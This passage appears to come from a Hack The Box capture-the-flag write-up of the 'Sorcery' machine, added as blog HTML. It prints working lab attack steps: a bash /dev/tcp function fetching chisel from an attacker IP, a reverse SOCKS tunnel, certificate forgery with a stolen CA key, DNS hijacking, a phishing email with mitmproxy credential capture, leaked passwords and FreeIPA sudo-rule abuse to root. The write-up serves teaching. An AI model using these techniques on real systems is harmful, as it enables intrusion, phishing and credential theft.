&quot;$&#123;PORT&#125;&quot; ] &amp;&amp; PORT=80</span><br><span class="line">&gt; </span><br><span class="line">&gt;   exec 3&lt;&gt;&quot;/dev/tcp/$&#123;HOST&#125;/$PORT&quot;</span><br><span class="line">&gt;   printf &#x27;GET %s HTTP/1.0\r\nHost: %s\r\n\r\n&#x27; &quot;$&#123;DOC&#125;&quot; &quot;$&#123;HOST&#125;&quot; &gt;&amp;3</span><br><span class="line">&gt;   (while read -r line; do</span><br><span class="line">&gt;    [ &quot;$line&quot; = $&#x27;\r&#x27; ] &amp;&amp; break</span><br><span class="line">&gt;   done &amp;&amp; cat) &lt;&amp;3</span><br><span class="line">&gt;   exec 3&gt;&amp;-</span><br><span class="line">&gt; &#125;</span><br><span class="line">user@7bfb70ee5b9c:/dns$ __curl http://10.10.16.19/chisel  &gt; chisel</span><br><span class="line">__curl http://10.10.16.19/chisel  &gt; chisel</span><br><span class="line">bash: connect: Connection refused</span><br><span class="line">bash: /dev/tcp/10.10.16.19/80: Connection refused</span><br><span class="line">bash: 3: Bad file descriptor</span><br><span class="line">bash: 3: Bad file descriptor</span><br><span class="line">user@7bfb70ee5b9c:/dns$ __curl http://10.10.16.19/chisel  &gt; chisel</span><br><span class="line">__curl http://10.10.16.19/chisel  &gt; chisel</span><br><span class="line">user@7bfb70ee5b9c:/dns$ __curl http://10.10.16.19/chisel  &gt; chisel</span><br><span class="line">__curl http://10.10.16.19/chisel  &gt; chisel</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Forging-a-TLS-Cert-for-kujen-sorcery-htb"><a href="#Forging-a-TLS-Cert-for-kujen-sorcery-htb" class="headerlink" title="Forging a TLS Cert for kujen.sorcery.htb"></a>Forging a TLS Cert for kujen.sorcery.htb</h3><p>Generate a CSR for an attacker-controlled subdomain, decrypt the Root CA private key with the passphrase from the FTP container, and sign:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ openssl genrsa -out kujen.sorcery.htb.key 2048                   </span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ openssl req -new -key kujen.sorcery.htb.key  -out kujen.sorcery.htb.csr -subj &quot;/CN=kujen&quot;</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ openssl req -new -key kujen.sorcery.htb.key  -out kujen.sorcery.htb.csr -subj &quot;/CN=kujen.sorcery.htb&quot;</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ ls</span><br><span class="line">infrastructure  kafka2.py  kafka.py  kujen.csr  kujen.key  kujen.sorcery.htb.csr  kujen.sorcery.htb.key  RootCA.crt  rootca.hash  RootCA.key</span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ openssl rsa -in RootCA.key -out RootCA-unenc.key</span><br><span class="line"></span><br><span class="line">Enter pass phrase for RootCA.key:</span><br><span class="line">writing RSA key</span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ openssl x509 -req -in kujen.sorcery.htb.csr -CA RootCA.crt -CAkey RootCA-unenc.key -CAcreateserial -out kujen.sorcery.htb.crt -days 365</span><br><span class="line"></span><br><span class="line">Certificate request self-signature ok</span><br><span class="line">subject=CN=kujen.sorcery.htb</span><br><span class="line">                                                                                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ cat kujen.sorcery.htb.key kujen.sorcery.htb.crt &gt; kujen.sorcery.htb.pem</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Hijacking-DNS-To-Resolve-kujen-sorcery-htb-To-Us"><a href="#Hijacking-DNS-To-Resolve-kujen-sorcery-htb-To-Us" class="headerlink" title="Hijacking DNS To Resolve kujen.sorcery.htb To Us"></a>Hijacking DNS To Resolve kujen.sorcery.htb To Us</h3><p>The container runs <code>dnsmasq</code>, fed by a <code>convert.sh</code> script that merges <code>/dns/hosts</code> with <code>/dns/hosts-user</code>. Append our entry pointing <code>kujen.sorcery.htb</code> at our attacker IP, regenerate the entries, and restart <code>dnsmasq</code>. The container has to crash and restart for the new config to take, but eventually the lookup picks up our injected record:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">user@7bfb70ee5b9c:/dns$ echo &#x27;10.10.16.16 kujen.sorcery.htb&#x27; &gt;&gt; /dns/hosts-user</span><br><span class="line">&lt; &#x27;10.10.16.16 kujen.sorcery.htb&#x27; &gt;&gt; /dns/hosts-user</span><br><span class="line">user@7bfb70ee5b9c:/dns$ ls</span><br><span class="line">ls</span><br><span class="line">chisel  convert.sh  entries  hosts  hosts-user</span><br><span class="line">user@7bfb70ee5b9c:/dns$ cat convert.sh</span><br><span class="line">cat convert.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">entries_file=/dns/entries</span><br><span class="line">hosts_files=(&quot;/dns/hosts&quot; &quot;/dns/hosts-user&quot;)</span><br><span class="line"></span><br><span class="line">&gt; $entries_file</span><br><span class="line"></span><br><span class="line">for hosts_file in $&#123;hosts_files[@]&#125;; do</span><br><span class="line">  while IFS= read -r line; do</span><br><span class="line">    key=$(echo $line | awk &#x27;&#123; print $1 &#125;&#x27;)</span><br><span class="line">    values=$(echo $line | cut -d &#x27; &#x27; -f2-)</span><br><span class="line"></span><br><span class="line">    for value in $values; do</span><br><span class="line">      echo &quot;$key $value&quot; &gt;&gt; $entries_file</span><br><span class="line">    done</span><br><span class="line">  done &lt; $hosts_file</span><br><span class="line">doneuser@7bfb70ee5b9c:/dns$ ./convert.sh</span><br><span class="line">./convert.sh</span><br><span class="line">user@7bfb70ee5b9c:/dns$ pkill -9 dnsmasq</span><br><span class="line">pkill -9 dnsmasq</span><br><span class="line">user@7bfb70ee5b9c:/dns$ dnsmasq --no-daemon --addn-hosts /dns/hosts-user</span><br><span class="line">dnsmasq --no-daemon --addn-hosts /dns/hosts-user</span><br><span class="line"></span><br><span class="line">dnsmasq: failed to create listening socket for port 53: Address already in use</span><br><span class="line">user@7bfb70ee5b9c:/dns$ pkill -9 dnsmasq</span><br><span class="line">pkill -9 dnsmasq</span><br><span class="line">user@7bfb70ee5b9c:/dns$ pkill -9 dnsmasq</span><br><span class="line">pkill -9 dnsmasq</span><br><span class="line">user@7bfb70ee5b9c:/dns$ ./convert.sh</span><br><span class="line">./convert.sh</span><br><span class="line">user@7bfb70ee5b9c:/dns$ dnsmasq --no-daemon --addn-hosts /dns/hosts-user</span><br><span class="line">dnsmasq --no-daemon --addn-hosts /dns/hosts-user</span><br><span class="line"></span><br><span class="line">dnsmasq: failed to create listening socket for port 53: Address already in use</span><br><span class="line">user@7bfb70ee5b9c:/dns$ pkill -9 dnsmasq</span><br><span class="line">pkill -9 dnsmasq</span><br><span class="line">user@7bfb70ee5b9c:/dns$ getent hosts mail</span><br><span class="line">getent hosts mail</span><br><span class="line">172.19.0.6      mail</span><br><span class="line">user@7bfb70ee5b9c:/dns$ getent hosts ftp</span><br><span class="line">getent hosts ftp</span><br><span class="line">172.19.0.10     ftp</span><br><span class="line">user@7bfb70ee5b9c:/dns$ ./chisel client 10.10.16.16:5555 R:socks</span><br><span class="line">./chisel client 10.10.16.16:5555 R:socks</span><br><span class="line">2025/06/18 14:52:29 client: Connecting to ws://10.10.16.16:5555</span><br><span class="line">2025/06/18 14:52:30 client: Connected (Latency 59.600986ms)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We also notice an internal <code>mail</code> host (<code>172.19.0.6</code>) running MailHog on port 1025. Useful in a moment.</p>
+<p>On the Kali side, set up the chisel SOCKS server:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ ./chisel server --port 5555 --reverse --socks5</span><br><span class="line">2025/06/18 10:52:26 server: Reverse tunnelling enabled</span><br><span class="line">2025/06/18 10:52:26 server: Fingerprint cf3z/NAnyvzF9YtPKxan/ypJD8YvfQpAwkPDiEs2WQs=</span><br><span class="line">2025/06/18 10:52:26 server: Listening on http://0.0.0.0:5555</span><br><span class="line">2025/06/18 10:52:29 server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Phishing-tom-summers-via-MailHog-mitmproxy"><a href="#Phishing-tom-summers-via-MailHog-mitmproxy" class="headerlink" title="Phishing tom_summers via MailHog + mitmproxy"></a>Phishing tom_summers via MailHog + mitmproxy</h3><p>The <code>infrastructure</code> repo references <code>tom_summers@sorcery.htb</code> as a maintainer of the Gitea project. With the SOCKS tunnel up, we send him a phishing email through the internal MailHog instance pointing at our forged hostname:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ proxychains -q swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.6 --port 1025 --data &quot;Subject: ANY\n\nANY\n\nhttps://kujen.sorcery.htb/user/login\n&quot;</span><br><span class="line">=== Trying 172.19.0.6:1025...</span><br><span class="line">=== Connected to 172.19.0.6.</span><br><span class="line">&lt;-  220 mailhog.example ESMTP MailHog</span><br><span class="line"> -&gt; EHLO kali</span><br><span class="line">&lt;-  250-Hello kali</span><br><span class="line">&lt;-  250-PIPELINING</span><br><span class="line">&lt;-  250 AUTH PLAIN</span><br><span class="line"> -&gt; MAIL FROM:&lt;nicole_sullivan@sorcery.htb&gt;</span><br><span class="line">&lt;-  250 Sender nicole_sullivan@sorcery.htb ok</span><br><span class="line"> -&gt; RCPT TO:&lt;tom_summers@sorcery.htb&gt;</span><br><span class="line">&lt;-  250 Recipient tom_summers@sorcery.htb ok</span><br><span class="line"> -&gt; DATA</span><br><span class="line">&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line"> -&gt; Subject: ANY</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; ANY</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; https://kujen.sorcery.htb/user/login</span><br><span class="line"> -&gt; </span><br><span class="line"> -&gt; .</span><br><span class="line">&lt;-  250 Ok: queued as LQL-zmpD1Ylkl3RGCBEI5uGVwhLdLlLRRdODoy9xje0=@mailhog.example</span><br><span class="line"> -&gt; QUIT</span><br><span class="line">&lt;-  221 Bye</span><br><span class="line">=== Connection closed with remote host.</span><br><span class="line">                                                                      </span><br></pre></td></tr></table></figure></div>
+
+<p>A monitoring bot reads new mail and follows links. Stand up <code>mitmproxy</code> listening on <code>kujen.sorcery.htb</code> with our forged cert and reverse-proxy it to the real <code>git.sorcery.htb</code>. The bot follows the link and submits credentials, which we capture in cleartext:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ mitmproxy --mode reverse:https://git.sorcery.htb/ --certs kujen.sorcery.htb.pem --save-stream-file trafficraw.k -p 443 --ssl-insecure</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/mitmproxy-creds.png"
+                      alt="Captured tom_summers credentials in mitmproxy"
+                ><figcaption>Captured tom_summers credentials in mitmproxy</figcaption></figure></p>
+<p>FINALLYYYYYY:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tom_summers:jNsMKQ6k2.XDMPu.</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="User-Foothold-tom-summers"><a href="#User-Foothold-tom-summers" class="headerlink" title="User Foothold - tom_summers"></a>User Foothold - tom_summers</h2><p>SSH in with the captured credentials. Looking around tom’s home, there’s an <code>Xvfb_screen0</code> framebuffer dump from a virtual X session he’s been running. Pull it down and OCR it:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$  scp tom_summers@sorcery.htb:~/Xvfb_screen0 .       </span><br><span class="line">(tom_summers@sorcery.htb) Password: </span><br><span class="line">Xvfb_screen0                                                          100%  515KB 407.5KB/s   00:01    </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ mv Xvfb_screen0 text.xwd</span><br><span class="line">                                                                                                        </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ convert text.xwd text.png</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ tesseract text.png output</span><br><span class="line"></span><br><span class="line">Estimating resolution as 125</span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/Sorcery]</span><br><span class="line">└─$ cat output.txt                                                         </span><br><span class="line">File Edit Search View Document Help</span><br><span class="line"></span><br><span class="line">lusername: tom_summers_admin</span><br><span class="line">password: dWpuk7cesBjT-</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>A note tom had open in a text editor leaks his admin account.</p>
+<h2 id="Privilege-Escalation-tom-summers-admin-→-ash-winter-→-root"><a href="#Privilege-Escalation-tom-summers-admin-→-ash-winter-→-root" class="headerlink" title="Privilege Escalation - tom_summers_admin → ash_winter → root"></a>Privilege Escalation - tom_summers_admin → ash_winter → root</h2><p>Logging in as <code>tom_summers_admin</code> and checking sudo:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tom_summers_admin@main:~$ sudo -l</span><br><span class="line">Matching Defaults entries for tom_summers_admin on localhost:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User tom_summers_admin may run the following commands on localhost:</span><br><span class="line">    (rebecca_smith) NOPASSWD: /usr/bin/docker login</span><br><span class="line">    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*</span><br><span class="line">tom_summers_admin@main:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>strace</code> rule as <code>rebecca_smith</code> is the interesting one - we can attach to her processes and watch syscall arguments. But first, look at what’s actually running on the box.</p>
+<h3 id="Leaking-ash-winter-From-a-cleanup-sh-Cron"><a href="#Leaking-ash-winter-From-a-cleanup-sh-Cron" class="headerlink" title="Leaking ash_winter From a cleanup.sh Cron"></a>Leaking ash_winter From a cleanup.sh Cron</h3><p>Keep <code>ps auxf</code> running in a loop and you’ll catch a <code>cleanup.sh</code> script being invoked with credentials passed on the command line:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ash_winter : w@LoiU8Crmdep</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="LDAP-Enumeration-as-ash-winter"><a href="#LDAP-Enumeration-as-ash-winter" class="headerlink" title="LDAP Enumeration as ash_winter"></a>LDAP Enumeration as ash_winter</h3><p>The host is FreeIPA-joined. Authenticated <code>ldapsearch</code> reveals that <code>ash_winter</code> is the owner of the <code>sysadmins</code> group, and that the <code>manage_sudorules_ldap</code> role grants its members the ability to add users to existing sudo rules:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ash_winter@main:~$ ldapsearch | grep -C 10 ash_winter</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/ldap-ash.png"
+                      alt="LDAP - ash_winter group ownership"
+                ><figcaption>LDAP - ash_winter group ownership</figcaption></figure></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ash_winter@main:~$ ldapsearch | grep -C 10 sudo | grep -C 10 ash</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/ldap-sudo.png"
+                      alt="LDAP - sudo rules"
+                ><figcaption>LDAP - sudo rules</figcaption></figure></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sorcery/ldap-sudo2.png"
+                      alt="LDAP - allow_sudo rule"
+                ><figcaption>LDAP - allow_sudo rule</figcaption></figure></p>
+<p>Combine the two: add ourselves to <code>sysadmins</code> (which gives us the <code>manage_sudorules_ldap</code> role), then use that role to add <code>ash_winter</code> to the <code>allow_sudo</code> rule, which is host&#x3D;ALL &#x2F; cmd&#x3D;ALL &#x2F; runas&#x3D;ALL:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ash_winter@main:~$ ipa group-add-member sysadmins --users=ash_winter</span><br><span class="line">  Group name: sysadmins</span><br><span class="line">  GID: 1638400005</span><br><span class="line">  Member users: ash_winter</span><br><span class="line">  Indirect Member of role: manage_sudorules_ldap</span><br><span class="line">-------------------------</span><br><span class="line">Number of members added 1</span><br><span class="line">-------------------------</span><br><span class="line">ash_winter@main:~$ ipa sudorule-add-user allow_sudo --users=ash_winter</span><br><span class="line">  Rule name: allow_sudo</span><br><span class="line">  Enabled: True</span><br><span class="line">  Host category: all</span><br><span class="line">  Command category: all</span><br><span class="line">  RunAs User category: all</span><br><span class="line">  RunAs Group category: all</span><br><span class="line">  Users: admin, ash_winter</span><br><span class="line">-------------------------</span><br><span class="line">Number of members added 1</span><br><span class="line">-------------------------</span><br><span class="line">ash_winter@main:~$ sudo /usr/bin/systemctl restart sssd</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><code>sssd</code> needs a kick to flush its cache and pick up the new sudo rule. After the restart, <code>sudo su</code> works:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ash_winter@main:~$ sudo su</span><br><span class="line">[sudo] password for ash_winter: </span><br><span class="line">root@main:/home/ash_winter# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@main:/home/ash_winter# cat /root/root.txt</span><br><span class="line">ea6ed008f0e70461f6ac2f582a4f8a58</span><br><span class="line">root@main:/home/ash_winter# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></div>
+
+<p>And that was Sorcery. A long, layered insane box that touches Cypher injection, WebAuthn bypass, Kafka protocol crafting, internal CA abuse, MITM phishing, OCR creds recovery, and FreeIPA sudo-rule abuse all in one chain. Hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Sorcery</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-04-26 19:07:03</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-04-26 21:34:29
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/04/26/Hackthebox-Sorcery/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/04/25/Certified-Evasion-Techniques-Professional-CETP-Review-%F0%9F%9A%80/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Certified Evasion Techniques Professional (CETP) - Review 🚀</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Sorcery</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-https-sorcery-htb"><span class="nav-text">Web Application - https:&#x2F;&#x2F;sorcery.htb&#x2F; </span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cypher-Injection-Leaking-the-Registration-Key"><span class="nav-text">Cypher Injection - Leaking the Registration Key</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Understanding-the-Submission-Flow"><span class="nav-text">Understanding the Submission Flow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cypher-Injection-Rewriting-the-Admin-Password"><span class="nav-text">Cypher Injection - Rewriting the Admin Password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypassing-WebAuthn-with-Chrome-DevTools"><span class="nav-text">Bypassing WebAuthn with Chrome DevTools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-Refresh-Endpoint-Discovering-debug"><span class="nav-text">DNS Refresh Endpoint - Discovering &#x2F;debug</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kafka-Protocol-Exploitation"><span class="nav-text">Kafka Protocol Exploitation</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pivoting-From-the-DNS-Container"><span class="nav-text">Pivoting From the DNS Container</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Pulling-chisel-In-Without-curl-wget"><span class="nav-text">Pulling chisel In Without curl&#x2F;wget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Forging-a-TLS-Cert-for-kujen-sorcery-htb"><span class="nav-text">Forging a TLS Cert for kujen.sorcery.htb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hijacking-DNS-To-Resolve-kujen-sorcery-htb-To-Us"><span class="nav-text">Hijacking DNS To Resolve kujen.sorcery.htb To Us</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phishing-tom-summers-via-MailHog-mitmproxy"><span class="nav-text">Phishing tom_summers via MailHog + mitmproxy</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-Foothold-tom-summers"><span class="nav-text">User Foothold - tom_summers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-tom-summers-admin-%E2%86%92-ash-winter-%E2%86%92-root"><span class="nav-text">Privilege Escalation - tom_summers_admin → ash_winter → root</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Leaking-ash-winter-From-a-cleanup-sh-Cron"><span class="nav-text">Leaking ash_winter From a cleanup.sh Cron</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LDAP-Enumeration-as-ash-winter"><span class="nav-text">LDAP Enumeration as ash_winter</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
